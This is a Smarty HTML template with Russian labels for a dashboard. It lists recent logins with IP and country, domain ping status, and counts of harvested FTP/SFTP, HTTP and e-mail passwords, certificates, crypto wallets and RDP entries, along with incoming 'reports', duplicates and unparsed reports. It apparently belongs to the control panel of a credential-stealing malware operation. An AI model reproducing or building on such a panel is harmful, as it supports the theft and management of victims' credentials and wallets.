<div class="mychart" id="ftp_last_24_hours">
<img width="680" height="230" src="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=chart&amp;routine=last_24_hours" alt="" />
</div>

{if ($show_logons_to_users || $priv_is_admin) && !$disable_ip_logger}
	{if count($login_list)}
			<h4>Последние входы в систему</h4>
			
			<table id="table_logins" width="700" cellspacing="0" summary="Latest user logins">
			<tr>
			<th width="14%">Логин</th>
			<th width="19%">IP</th>
			<th width="42%">Страна</th>
			<th width="25%">Время входа</th>
			</tr>

			{foreach from=$login_list item=login_item}
			<tr>
			<td>{$login_item.user}</td>
			<td>{$login_item.ip}</td>
			<td>{country base_path="includes/design/images/flags/" country_code=$login_item.country_code country_name=$login_item.country_name}</td>
			<td>{$login_item.import_time}</td>
			</tr>
			{/foreach}

			</table><br />
	{/if}
{/if}

{if $show_domains && ($show_domains_to_users || $priv_is_admin)}
	{if count($domain_list)}
			<h4>Домены</h4><table id="table_domains" width="700" cellspacing="0" summary="Domains ping status">
			<tr>
			<th width="75%">Домен</th>
			<th width="25%">Статус</th>
			</tr>

			{foreach from=$domain_list item=domain_item}
			<tr>
			<td><a target="_blank" href="{$domain_item.url}">{$domain_item.url}</a></td>
			<td><p id="chk_status_{$domain_item.domain_id}"><span class="wait"></span></p></td>
			</tr>
			{/foreach}

			</table><br />
	{/if}
{/if}

			<table id="table_stats" width="700" cellspacing="0" summary="Statistics">
			<tr>
			<th colspan="2">Статистика</th>
			</tr>
			
			<tr><td width="75%">Время сервера</td><td width="25%">{$server_time}</td></tr>
			<tr><td>FTP/SFTP в списке</td><td>{$total_ftp_items_count+$total_ssh_items_count}</td></tr>
			{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
			<tr><td>HTTP/HTTPS в списке</td><td>{$total_http_items_count}</td></tr>
			{/if}
			{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
			<tr><td>E-mail паролей в списке</td><td>{$total_email_items_count}</td></tr>
			{/if}
			{if $show_other_to_users || $priv_is_admin}
			<tr><td>Сертификатов в списке</td><td>{$total_cert_items_count}</td></tr>
			{/if}
			{if $show_other_to_users || $priv_is_admin}
			<tr><td>Кошельков в списке</td><td>{$total_wallet_items_count}</td></tr>
			{/if}
			<tr><td>RDP в списке</td><td>{$total_rdp_items_count}</td></tr>
			<tr><td>Уникальных отчетов</td><td>{$total_reports_count}</td></tr>
			<tr><td>Получено дубликатов</td><td>{$report_duplicates}</td></tr>
			<tr><td>Не обработано отчетов</td><td>{$total_nonparsed_reports}</td></tr>
			<tr><td>Событий в системных логах</td><td>{$log_events_count}</td></tr>
			<tr><td>Полный размер отчетов в БД</td><td>{$total_reports_size|file_size}</td></tr>
			<tr><td>Полный размер БД</td><td>{$db_size|file_size}</td></tr>
			{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
			<tr><td>Добавлено FTP (HTTP) за последние 24 часа</td><td>{$new_ftp_last_24_hours} ({$new_http_last_24_hours})</td></tr>
			<tr><td>Добавлено FTP (HTTP) за последний час</td><td>{$new_ftp_last_hour} ({$new_http_last_hour})</td></tr>
			<tr><td>Добавлено FTP (HTTP) за последние 10 минут</td><td>{$new_ftp_last_10_minutes} ({$new_http_last_10_minutes})</td></tr>
			{else}
			<tr><td>Добавлено FTP за последние 24 часа</td><td>{$new_ftp_last_24_hours}</td></tr>
			<tr><td>Добавлено FTP за последний час</td><td>{$new_ftp_last_hour}</td></tr>
			<tr><td>Добавлено FTP за последние 10 минут</td><td>{$new_ftp_last_10_minutes}</td></tr>
			{/if}
			<tr><td>Добавлено отчетов за последние 24 часа</td><td>{$new_reports_last_24_hours}</td></tr>
			<tr><td>Добавлено отчетов за последний час</td><td>{$new_reports_last_hour}</td></tr>
			<tr><td>Добавлено отчетов за последние 10 минут</td><td>{$new_reports_last_10_minutes}</td></tr>
			</table>
